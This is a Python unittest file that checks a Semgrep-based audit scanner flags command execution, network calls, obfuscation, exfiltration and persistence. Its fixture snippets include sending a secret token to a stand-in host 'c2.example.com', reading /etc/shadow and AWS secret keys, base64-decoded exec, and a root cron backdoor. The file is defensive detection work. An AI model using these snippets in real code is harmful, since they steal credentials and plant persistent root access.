# tests/test_semgrep_rule_fixtures.py
import unittest
import tempfile
from pathlib import Path
from models.audit.tools.semgrep_runner import SemgrepRunner

class TestSemgrepRuleFixtures(unittest.TestCase):
    """End-to-end positive and negative test suite for the 13 canonical Semgrep rules."""

    @classmethod
    def setUpClass(cls):
        cls.runner = SemgrepRunner()
        cls.available = cls.runner.is_available()

    def _scan_snippet(self, code: str, lang: str = "py") -> list:
        if not self.available:
            self.skipTest("Semgrep CLI not available in current environment")
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / f"test_fixture.{lang}"
            p.write_text(code, encoding="utf-8")
            res = self.runner.scan_directory(td)
            return res.findings

    def test_cmd_001_subprocess(self):
        # Positive
        findings = self._scan_snippet("import subprocess\nsubprocess.run('ls', shell=True)\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("CMD_001", rule_ids)

        # Negative
        findings_neg = self._scan_snippet("x = 1 + 2\n")
        rule_ids_neg = [f["rule_id"] for f in findings_neg]
        self.assertNotIn("CMD_001", rule_ids_neg)

    def test_net_001_requests(self):
        findings = self._scan_snippet("import requests\nrequests.post('http://198.51.100.2', json={})\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("NET_001", rule_ids)

    def test_net_002_socket(self):
        findings = self._scan_snippet("import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("NET_002", rule_ids)

    def test_dyn_001_eval(self):
        findings = self._scan_snippet("eval('2 + 2')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("DYN_001", rule_ids)

    def test_fil_001_probe(self):
        findings = self._scan_snippet("with open('/etc/shadow', 'r') as f:\n    pass\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("FIL_001", rule_ids)

    def test_env_001_getenv(self):
        findings = self._scan_snippet("import os\nsecret = os.environ.get('AWS_SECRET_KEY')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("ENV_001", rule_ids)

    def test_obf_001_taint(self):
        code = (
            "import base64\n"
            "raw = base64.b64decode(b'cHJpbnQoMSk=')\n"
            "payload = raw.decode('utf-8')\n"
            "exec(payload)\n"
        )
        findings = self._scan_snippet(code)
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("OBF_001", rule_ids)

    def test_exf_001_taint(self):
        code = (
            "import os, requests\n"
            "token = os.environ.get('SECRET_TOKEN')\n"
            "data = {'key': token}\n"
            "requests.post('http://c2.example.com', json=data)\n"
        )
        findings = self._scan_snippet(code)
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EXF_001", rule_ids)

    def test_per_001_persistence(self):
        findings = self._scan_snippet("with open('/etc/cron.d/backdoor', 'w') as f:\n    f.write('* * * * * root /bin/sh')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("PER_001", rule_ids)

    def test_emb_001_torch_save(self):
        # Raw data dump positive
        findings = self._scan_snippet("import torch\ntorch.save(raw_data, 'output.pt')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EMB_001", rule_ids)

        # Safe state_dict negative exemption
        findings_safe = self._scan_snippet("import torch\ntorch.save(model.state_dict(), 'model.pt')\n")
        rule_ids_safe = [f["rule_id"] for f in findings_safe]
        self.assertNotIn("EMB_001", rule_ids_safe)

    def test_emb_002_shutil_copy(self):
        findings = self._scan_snippet("import shutil\nshutil.copy('data.csv', 'export/')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EMB_002", rule_ids)

    def test_emb_003_logging(self):
        findings = self._scan_snippet("print(raw_data)\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EMB_003", rule_ids)

    def test_emb_004_stego(self):
        findings = self._scan_snippet("import struct\npacked = struct.pack('<I', 12345)\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EMB_004", rule_ids)

    def test_go_rule_cmd_001(self):
        go_code = (
            "package main\n"
            "import \"os/exec\"\n"
            "func main() {\n"
            "    cmd := exec.Command(\"ls\", \"-l\")\n"
            "    cmd.Run()\n"
            "}\n"
        )
        findings = self._scan_snippet(go_code, lang="go")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("CMD_001", rule_ids)

    def test_shell_rule_per_001(self):
        sh_code = "#!/bin/bash\necho '* * * * * root /bin/sh' >> /etc/crontab\n"
        findings = self._scan_snippet(sh_code, lang="sh")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("PER_001", rule_ids)

if __name__ == "__main__":
    unittest.main()
